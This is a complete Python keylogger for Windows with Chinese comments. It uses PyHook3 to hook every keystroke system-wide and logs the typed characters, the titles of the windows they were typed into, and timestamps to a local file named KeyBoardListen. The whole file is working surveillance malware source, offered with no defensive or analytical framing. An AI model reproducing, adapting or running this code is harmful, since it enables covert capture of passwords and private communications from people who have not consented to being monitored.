# -*- coding: utf-8 -*-    
from ctypes import *  
import pythoncom  
import PyHook3
import win32clipboard  
import os,sys
import time
path=os.getcwd()

user32 = windll.user32  
kernel32 = windll.kernel32  
psapi = windll.psapi
current_window = None

# Fkey=["F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"]
# 定义击键监听事件函数  
def OnKeyboardEvent(event):
    global current_window,path
    FileStr=""
    
    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)  
    if event.Window != current_window:  
        current_window = event.Window
        # event.WindowName有时候会不好用
        # 所以调用底层API喊来获取窗口标题
        windowTitle = create_string_buffer(512)
        windll.user32.GetWindowTextA(event.Window,
                                     byref(windowTitle),
                                     512)
        windowName = windowTitle.value.decode('gbk')
        FileStr+="\n"+("-"*50)+"\n窗口:%s\n时间:%s\n"%(windowName,time.strftime('%Y-%m-%d %H:%M:%S'))
        #print("\n-----------------")
        #print("窗口名:%s"%windowName)
        # print("窗口ID:%s"%event.Window)
    # 检测击键是否常规按键（非组合键等）  
    if event.Ascii > 32 and event.Ascii <127:
        FileStr+=chr(event.Ascii)
        #print(chr(event.Ascii),end=''
    else:
        if(event.Key=="Space"):
            FileStr+=" "
        elif(event.Key=="Return"):
            FileStr+="[回车] "
        elif(event.Key=="Back"):
            FileStr+="[删除] "
    #写入文件    
    fp=open(path+"/KeyBoardListen","a",encoding='utf-8')
    fp.write(FileStr)
    fp.close()
    # 循环监听下一个击键事件
    return True

# 创建并注册hook管理器  
kl = PyHook3.HookManager()  #
kl.KeyDown = OnKeyboardEvent


#写入日期   
fp=open(path+"/KeyBoardListen","a",encoding='utf-8')
fp.write('\n\n'+'#######################################'
	+'\n#'+' '*9+time.strftime('%Y-%m-%d %H:%M:%S')+' '*9+'#'
	+'\n'+'#######################################')
fp.close()
# 注册hook并执行  
kl.HookKeyboard()
pythoncom.PumpMessages()

